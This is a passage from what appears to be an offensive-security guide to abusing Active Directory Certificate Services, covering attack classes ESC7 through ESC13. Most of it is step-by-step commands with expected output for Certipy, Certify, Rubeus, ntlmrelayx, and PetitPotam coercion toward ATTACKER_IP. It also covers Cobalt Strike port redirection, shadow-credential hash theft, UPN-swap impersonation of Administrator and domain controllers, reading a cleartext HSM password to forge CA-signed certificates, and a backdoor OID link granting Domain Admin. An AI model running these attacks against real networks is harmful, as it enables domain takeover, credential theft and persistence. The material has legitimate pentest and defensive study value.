-----END RSA PRIVATE KEY-----
```

**Important:** Save the private key and note the Request ID!

**Step 2: Approve the pending request**

```powershell
Import-Module PSPKI

Get-CertificationAuthority -ComputerName dc.domain.local | 
  Get-PendingRequest -RequestID 336 | 
  Approve-CertificateRequest
```

**Expected output:**

```
[*] Certificate request 336 has been approved
```

**Step 3: Download approved certificate**

```cmd
Certify.exe download /ca:dc.domain.local\DC-CA /id:336
```

**Step 4: Combine with saved private key and authenticate**

```cmd
# Convert to PFX
certutil -MergePFX downloaded.crt combined.pfx

# Authenticate
Rubeus.exe asktgt /user:targetuser /certificate:combined.pfx /password:pfx_password /ptt
```

#### Attack 3: Manage Certificates + SubCA Template

**This is the most powerful ESC7 variant** that doesn't require CA service restart.

**Prerequisites:**

* ManageCA permission (to add yourself as officer and enable SubCA)
* Manage Certificates permission (can be granted from ManageCA)
* SubCA template must be enabled (can be enabled from ManageCA)

**Why this works:** The SubCA template is vulnerable to ESC1 but only administrators can enroll. However, a Certificate Manager can issue FAILED requests. Attack flow:

```
1. Request SubCA certificate (will be denied)
2. Save private key
3. Use Manage Certificates to issue the failed request
4. Download the issued certificate
5. Authenticate with certificate
```

**Step 1: Grant yourself Manage Certificates (if you only have ManageCA)**

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
```

**Expected output:**

```
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'john' on 'corp-DC-CA'
```

**Step 2: Enable SubCA template (if not already enabled)**

```bash
# List current templates
certipy ca -ca 'corp-DC-CA' -list-templates -username john@corp.local -password Passw0rd

# Enable SubCA if not present
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
```

**Expected output:**

```
[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

**Step 3: Request SubCA certificate (will be denied)**

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
```

**Expected output:**

```
[*] Requesting certificate via RPC
[-] Got error: CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

**Critical:** Answer 'y' to save the private key! Note the Request ID!

**Step 4: Issue the failed request**

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
```

**Expected output:**

```
[*] Successfully issued certificate
```

**Step 5: Retrieve the issued certificate**

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
```

**Expected output:**

```
[*] Retrieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

**Step 6: Authenticate**

```bash
certipy auth -pfx administrator.pfx -username administrator -domain corp.local -dc-ip 172.16.19.100
```

#### Attack 4: Manage Certificates Extension Abuse (SetExtension)

**New primitive discovered in Certify 2.0** - only requires Manage Certificates role.

**Understanding the attack:**

**ICertAdmin::SetExtension RPC method:**

* Can be executed by Certificate Manager role
* Traditionally used to update extensions on pending requests
* Attacker abuses it to append custom extensions

**Attack technique:**

```
1. Submit request that remains pending (manager approval required)
2. Use SetExtension to add custom Certificate Issuance Policy OID
3. CA doesn't overwrite attacker-controlled extension value
4. Resulting certificate has malicious extension
5. Use certificate in subsequent attacks (ESC13, domain escalation)
```

**Why this is powerful:**

* Previously, Manage Certificates was "less dangerous" than ManageCA
* Now can achieve full privilege escalation
* Doesn't require touching CA configuration
* Doesn't need CA service restart

**Exploitation with Certify 2.0:**

**Step 1: Submit pending request**

```cmd
Certify.exe request --ca SERVER\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
```

**Expected output:**

```
[*] Template              : SecureUser
[*] CA Response           : The certificate is still pending.
[*] Request ID            : 1337
```

**Step 2: Inject custom extension**

```cmd
Certify.exe manage-ca --ca SERVER\CA-NAME --request-id 1337 --set-extension "1.1.1.1=DER,10,01 01 00 00"
```

**Parameters:**

* `--request-id 1337` - Pending request ID
* `--set-extension` - Add custom extension
* `"1.1.1.1=DER,10,01 01 00 00"` - Fake issuance-policy OID

**What this does:** Injects Certificate Issuance Policy OID (1.1.1.1) that can be used in ESC13 attacks or satisfy Application Policy requirements of other vulnerable templates.

**Step 3: Issue/approve request** If you also have Manage Certificates approval rights:

```powershell
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 1337 | Approve-CertificateRequest
```

**Step 4: Download certificate**

```cmd
Certify.exe request-download --ca SERVER\CA-NAME --id 1337
```

**Result:** Certificate contains malicious issuance-policy OID and can be used for subsequent attacks.

**Certipy equivalent (v4.7+):**

```bash
certipy ca -ca 'corp-DC-CA' -request-id 1337 -set-extension "1.1.1.1=DER,10,01 01 00 00" -username john@corp.local -password Passw0rd
```

***

### ESC8: NTLM Relay to AD CS HTTP Endpoints

#### Understanding ESC8

**ESC8 exploits HTTP-based certificate enrollment interfaces** that are vulnerable to NTLM relay attacks. These web interfaces don't adequately protect against NTLM relay even over HTTPS.

**Vulnerable HTTP enrollment endpoints:**

**1. Web Enrollment Interface (http://CA/certsrv/)**

```
Protocol: HTTP only by default
Authentication: NTLM only (explicitly)
Protection: None against NTLM relay
Path: /certsrv/certfnsh.asp (certificate processing page)
```

**2. Certificate Enrollment Service (CES)**

```
Protocol: HTTPS by default (but doesn't help)
Authentication: Negotiate (Kerberos or NTLM)
Attack: Downgrade to NTLM during relay
Protection: No EPA (Extended Protection for Authentication)
```

**3. Certificate Enrollment Policy (CEP) Web Service**

```
Same issues as CES
```

**4. Network Device Enrollment Service (NDES)**

```
Same issues as CES
```

**Why HTTPS doesn't protect:** HTTPS alone doesn't prevent NTLM relay. Protection requires:

* HTTPS + Channel Binding
* Enabled via Extended Protection for Authentication (EPA)
* **AD CS does NOT enable EPA on IIS by default**

**Attack significance:**

```
Common limitation of NTLM relay:
- Short session duration
- Can't interact with services requiring signing

ESC8 overcomes this:
- Get CERTIFICATE for victim
- Certificate validity = months/years
- Can be used with services requiring NTLM signing
```

**Perfect scenario:** If AD CS installed + web enrollment enabled + Machine template published = any computer with spooler service active can be compromised!

#### Enumeration

**Certify enumeration:**

```cmd
Certify.exe cas
```

**Expected output:**

```
[*] Enterprise CA Name            : DC01-CA
[*] DNS Hostname                  : dc01.corp.local
[*] Web Enrollment URL            : https://dc01.corp.local/certsrv/
[*] User Enrollment URL           : https://dc01.corp.local/CertEnroll/
[*] Certificate Templates         : Machine, User, WebServer
```

**Check CES endpoints via certutil:**

```cmd
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

**PowerShell with PSPKI:**

```powershell
Import-Module PSPKI
Get-CertificationAuthority | Select-Object Name,Enroll* | Format-List *
```

**Expected output:**

```
Name                     : DC01-CA
EnrollmentUrl            : https://dc01.corp.local/certsrv/
PolicyServerUrl          : https://dc01.corp.local/ADPolicyProvider_CEP_Kerberos/service.svc
```

#### Exploitation

**Attack scenario requirements:**

1. HTTP-based AD CS endpoint accessible
2. Victim account authenticates to compromised machine
3. Template allowing domain authentication available (Machine or User)

**Setup on compromised machine (Cobalt Strike example):**

```
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\PortBender\WinDivert64.sys

# Redirect port 445 to 8445
beacon> PortBender redirect 445 8445

# Forward to Team Server
beacon> rportfwd 8445 127.0.0.1 445

# Create SOCKS proxy
beacon> socks 1080
```

**Attacker machine - start ntlmrelayx:**

```bash
proxychains ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```

**Parameters:**

* `-t http://ca.corp.local/certsrv/certfnsh.asp` - Target AD CS endpoint
* `-smb2support` - Enable SMB2
* `--adcs` - AD CS mode (request certificates)
* `--no-http-server` - Don't start HTTP server (using SMB relay)

**Force authentication from victim:**

```cmd
# Using SpoolSample
execute-assembly C:\SpoolSample\SpoolSample.exe VICTIM_DC COMPROMISED_HOST

# Or using PetitPotam
execute-assembly C:\PetitPotam\PetitPotam.exe COMPROMISED_HOST VICTIM_DC
```

**Expected output:**

```
[*] HTTPD: Received connection from 10.10.10.15
[*] HTTPD: Authenticating against http://ca.corp.local/certsrv/certfnsh.asp
[*] Requesting certificate for 'CORP\DC01$'
[*] Template was not specified. Defaulting to Machine
[*] Successfully requested certificate
[*] Request ID is 447
[*] Got certificate with UPN 'DC01$@corp.local'
[*] Certificate object SID is 'S-1-5-21-...-1001'
[*] Saved certificate and private key to 'dc01.pfx'
```

#### Certipy Relay

**Certipy simplifies ESC8 attacks:**

```bash
certipy relay -ca ca.corp.local
```

**What this does:**

* Starts SMB relay server on 0.0.0.0:445
* Automatically targets http://ca.corp.local/certsrv/certfnsh.asp
* Detects if account name ends with $ (Machine template) or not (User template)
* Requests appropriate certificate
* Saves certificate automatically

**Expected output:**

```
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

**Specify custom template:**

```bash
# For domain controllers
certipy relay -ca ca.corp.local -template DomainController
```

**Coerce authentication:**

```bash
# In another terminal, while certipy relay is running
# Use PetitPotam, PrinterBug, or other coercion techniques

python3 PetitPotam.py -d corp.local -u user -p password ATTACKER_IP VICTIM_DC
```

***

### ESC9: No Security Extension

#### Understanding ESC9

**ESC9 exploits the CT\_FLAG\_NO\_SECURITY\_EXTENSION flag** (0x80000) in msPKI-Enrollment-Flag, which prevents embedding the szOID\_NTDS\_CA\_SECURITY\_EXT security extension in certificates.

**Security extension background:** Post-May 2022 patches, certificates should include szOID\_NTDS\_CA\_SECURITY\_EXT containing:

* Certificate holder's objectSid
* Enables strong certificate binding
* Prevents SAN-only mapping attacks

**CT\_FLAG\_NO\_SECURITY\_EXTENSION:** When this flag is set, issued certificates deliberately omit the security extension, creating a security gap.

**Required conditions:**

1. ✓ StrongCertificateBindingEnforcement NOT set to 2 (default is 1)
2. ✓ OR CertificateMappingMethods includes UPN flag
3. ✓ Certificate template has CT\_FLAG\_NO\_SECURITY\_EXTENSION flag
4. ✓ Template includes client authentication EKU
5. ✓ **Attacker has GenericWrite over any account**

**Attack principle:**

```
1. Attacker (John) has GenericWrite over Victim (Jane)
2. Obtain Jane's credentials (Shadow Credentials)
3. Change Jane's UPN to target user's sAMAccountName (Administrator)
4. Request certificate as Jane with ESC9-vulnerable template
5. Certificate UPN = "Administrator" (no objectSid due to flag)
6. Revert Jane's UPN to original
7. Authenticate with certificate as Administrator
8. Domain Admin access
```

#### Exploitation

**Scenario:** John@corp.local has GenericWrite over Jane@corp.local, goal is to compromise Administrator@corp.local.

**Step 1: Obtain Jane's hash via Shadow Credentials**

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

**Expected output:**

```
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated
[*] Adding Key Credential to Jane
[*] Successfully added Key Credential
[*] Trying to authenticate with certificate
[*] Got TGT for 'Jane@corp.local'
[*] Got hash for 'Jane@corp.local': aad3b435b51404eeaad3b435b51404ee:a1b2c3d4...
```

**Step 2: Change Jane's UPN to Administrator (without @corp.local)**

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

**Why omit @corp.local:** Administrator@corp.local already exists as Administrator's UPN. Setting Jane's UPN to just "Administrator" doesn't violate the uniqueness constraint.

**Expected output:**

```
[*] Successfully updated 'Jane' with UPN 'Administrator'
```

**Step 3: Request certificate as Jane using ESC9-vulnerable template**

```bash
certipy req -username jane@corp.local -hashes :a1b2c3d4... -ca corp-DC-CA -template ESC9
```

**Expected output:**

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 892
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID    <-- KEY INDICATOR
[*] Saved certificate and private key to 'administrator.pfx'
```

**Note:** "Certificate has no object SID" confirms ESC9 exploitation.

**Step 4: Revert Jane's UPN**

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

**Expected output:**

```
[*] Successfully updated 'Jane' with UPN 'Jane@corp.local'
```

**Step 5: Authenticate with certificate**

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

**Must specify `-domain corp.local`** because certificate doesn't include domain (only sAMAccountName).

**Expected output:**

```
[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

***

### ESC10: Weak Certificate Mappings

#### Understanding ESC10

**ESC10 involves weak certificate mapping configurations on Domain Controllers** that allow certificate authentication to succeed based on weak identifiers, bypassing the security extension.

**Two registry keys on Domain Controllers:**

**1. CertificateMappingMethods**

```
Location: HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel
Default (post-patch): 0x18 (0x8 | 0x10)
Old default: 0x1F

Bit flags:
0x1  = Subject/Issuer
0x2  = Issuer
0x4  = UPN (WEAK - enables Case 2)
0x8  = S4U2Self
0x10 = Explicit altSecurityIdentities
```

**2. StrongCertificateBindingEnforcement**

```
Location: HKLM\SYSTEM\CurrentControlSet\Services\Kdc
Default (post-patch): 1
Old default: 0

Values:
0 = Disabled (VERY WEAK - enables Case 1)
1 = Enabled (default)
2 = Full enforcement (strongest)
```

#### Case 1: StrongCertificateBindingEnforcement = 0

**When disabled, certificate mapping is extremely weak:** Any account A with GenericWrite can compromise any account B.

**Attack flow:**

```
1. Obtain victim account (Jane) credentials via Shadow Credentials
2. Change Jane's UPN to target (Administrator), omitting domain
3. Request ANY certificate template as Jane
4. Revert Jane's UPN
5. Authenticate with certificate as Administrator
6. Domain Admin access
```

**Exploitation (identical to ESC9):**

**Step 1: Get Jane's hash**

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -a Jane
```

**Step 2: Modify Jane's UPN**

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

**Step 3: Request certificate (any template with client auth)**

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes :hash
```

**Default "User" template works** - don't need ESC9-specific template!

**Step 4: Revert UPN**

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

**Step 5: Authenticate**

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

#### Case 2: CertificateMappingMethods Includes UPN Bit (0x4)

**When UPN mapping is enabled:** Account A with GenericWrite can compromise any account B that:

* **Lacks userPrincipalName property**, OR
* userPrincipalName doesn't match sAMAccountName

**Common targets:**

```
Machine accounts (COMPUTER$):
- Never have userPrincipalName by default
- Can be compromised via this technique

Built-in Administrator:
- Often doesn't have userPrincipalName set
- High-value target
- Elevated LDAP privileges
```

**Attack to compromise DC$ machine account:**

**Step 1: Get Jane's hash**

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

**Step 2: Set Jane's UPN to target machine account**

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

**Important:** Include full UPN with domain for machine accounts!

**Step 3: Request certificate**

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes :hash
```

**Step 4: Revert Jane's UPN**

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

**Step 5: Authenticate via Schannel (LDAPS)**

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

**Must use `-ldap-shell`** for machine account authentication via Schannel.

**Expected output:**

```
[*] Trying to authenticate via Schannel
[+] Authenticated as: u:CORP\DC$
[*] Starting LDAP shell
```

**Step 6: RBCD attack via LDAP shell**

```bash
# In LDAP shell
certipy-ldap> set_rbcd DC$ ATTACKER_PC$
```

**This enables Resource-Based Constrained Delegation**, allowing you to impersonate any user to the DC and obtain SYSTEM.

**Alternative target: Built-in Administrator**

```bash
# Check if Administrator has userPrincipalName
certipy account -username John@corp.local -password Passw0rd! -user Administrator read

# If no UPN, can compromise via same technique
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes :hash
certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128 -ldap-shell
```

**Why Administrator is valuable:**

* Elevated LDAP privileges by default
* Can modify most AD objects
* No Group Policy restrictions
* Can perform DCSync (if Domain Admin)

***

### ESC11: Relaying NTLM to ICPR

#### Understanding ESC11

**ESC11 is an RPC-based relay attack** to the Interface for Certificate Request Protocol (ICPR). Unlike ESC8 (HTTP relay), this uses RPC protocol.

**Vulnerability condition:** CA Server configured **without IF\_ENFORCEENCRYPTICERTREQUEST** flag, allowing NTLM relay attacks over RPC without signing enforcement.

**Why this matters:**

* RPC is used for certificate enrollment
* If encryption not enforced, NTLM can be relayed
* Can request certificates for any relayed account
* Often overlooked in hardening

#### Enumeration

**Certipy can detect ESC11:**

```bash
certipy find -u user@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
```

**Expected output if vulnerable:**

```
Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    Enforce Encryption for Requests     : Disabled    <-- VULNERABLE
    Request Disposition                 : Issue
    
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
```

**Key indicators:**

* `Enforce Encryption for Requests: Disabled`
* `Request Disposition: Issue` (auto-approve)

#### Exploitation

**Setup relay server:**

```bash
certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
```

**Parameters:**

* `-target 'rpc://DC01.domain.local'` - RPC endpoint (not HTTP)
* `-ca 'DC01-CA'` - Certificate Authority name
* `-dc-ip 192.168.100.100` - DC IP for Kerberos

**Expected output:**

```
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
```

**Coerce authentication:**

```bash
# In another terminal
python3 PetitPotam.py ATTACKER_IP VICTIM_TARGET
```

**When victim authenticates:**

```
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

**For Domain Controllers:**

```bash
# Must specify DomainController template
certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -template DomainController -dc-ip 192.168.100.100
```

***

### ESC12: Shell Access to ADCS CA with YubiHSM

#### Understanding ESC12

**ESC12 involves physical USB HSM devices** (like Yubico YubiHSM2) used to store CA private keys. If CA stores its private key on external HSM device and you gain shell access to CA server, you can recover the CA private key.

**YubiHSM authentication key storage:**

```
Location: HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword
Format: Cleartext (!)
Purpose: Authenticate to YubiHSM device
Impact: With shell on CA + this password = CA private key access
```

**Attack scenario:**

```
1. Compromise CA server (RCE, local admin, etc.)
2. Access registry to get YubiHSM auth password
3. Import CA certificate (public, freely available)
4. Associate with YubiHSM private key using password
5. Use certutil to forge arbitrary certificates with CA key
```

#### Exploitation

**Step 1: Obtain CA certificate (public)** Download from CA web enrollment or via:

```cmd
certutil -ca.cert ca_certificate.cer
```

**Step 2: Import CA certificate to user store**

```cmd
certutil -addstore -user my ca_certificate.cer
```

**Step 3: Read YubiHSM password from registry**

```cmd
reg query HKLM\SOFTWARE\Yubico\YubiHSM /v AuthKeysetPassword
```

**Expected output:**

```
AuthKeysetPassword    REG_SZ    SuperSecretPassword123
```

**Step 4: Associate with YubiHSM private key**

```cmd
certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my "CA Common Name"
```

**Parameters:**

* `-csp "YubiHSM Key Storage Provider"` - Use YubiHSM CSP
* `-repairstore` - Associate certificate with private key
* `"CA Common Name"` - CA's CN from certificate

**Step 5: Forge arbitrary certificate**

```cmd
certutil -sign malicious_request.req forged_certificate.cer
```

**What you can do:**

* Sign certificates for any user
* Create certificates with any properties
* Full CA compromise
* Issue certificates valid for years
* Complete domain control

***

### ESC13: OID Group Link Abuse

#### Understanding ESC13

**ESC13 exploits msDS-OIDToGroupLink attribute** that links Certificate Issuance Policy OIDs to Active Directory groups. When a user presents a certificate with a linked OID, the system treats them as a member of the linked group.

**How OID linking works:**

```
1. Create OID object in CN=OID,CN=Public Key Services,CN=Services
2. Set msDS-OIDToGroupLink to point to AD group
3. Configure certificate template to include this OID
4. User enrolls in template
5. Resulting certificate includes the OID
6. Upon authentication, user gains privileges of linked group
```

**Attack principle:** If you have enrollment rights to a template linked to a privileged group OID, you automatically inherit that group's privileges when using the certificate.

#### Enumeration

**Check-ADCSESC13.ps1 script:**

```powershell
# Download and run enumeration script
.\Check-ADCSESC13.ps1
```

**Expected output:**

```
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

**Manual LDAP enumeration:**

```powershell
# Get OID objects with group links
Get-ADObject -Filter * -SearchBase "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink | Where-Object {$_.'msDS-OIDToGroupLink'}
```

**Certify enumeration:**

```cmd
Certify.exe find /showAllPermissions
```

#### Exploitation

**Scenario:** John has enrollment rights to VulnerableTemplate, which is linked to VulnerableGroup (Domain Admins).

**Step 1: Request certificate with OID**

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

**Expected output:**

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 673
[*] Got certificate with UPN 'John@domain.local'
[*] Certificate has issuance policy: 1.3.6.1.4.1.311.21.8.3025710... <-- OID PRESENT
[*] Saved certificate and private key to 'john.pfx'
```

**Step 2: Authenticate with certificate**

```bash
certipy auth -pfx john.pfx -dc-ip 192.168.100.100 -username john -domain domain.local
```

**What happens:**

* Certificate includes OID in issuance policy extension
* DC recognizes OID is linked to VulnerableGroup
* John is treated as member of VulnerableGroup
* If VulnerableGroup is Domain Admins, John has DA privileges

**Certify equivalent:**

```cmd
Certify.exe request /ca:DC01.domain.local\DC01-CA /template:VulnerableTemplate
Rubeus.exe asktgt /user:john /certificate:john.pfx /password:pfx_password /ptt
```

#### Persistence via ESC13

**If you're Domain Admin, create your own OID link:**

```powershell
# Create new OID
$OID = New-ADObject -Type msPKI-Enterprise-Oid -Name "BackdoorOID" -Path "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -PassThru

# Link OID to Domain Admins
Set-ADObject $OID -Add @{'msDS-OIDToGroupLink'='CN=Domain Admins,CN=Users,DC=domain,DC=local'}

# Modify template to include OID
# (requires template modification permissions)
```

**Result:** Any certificate from this template grants Domain Admin privileges automatically.

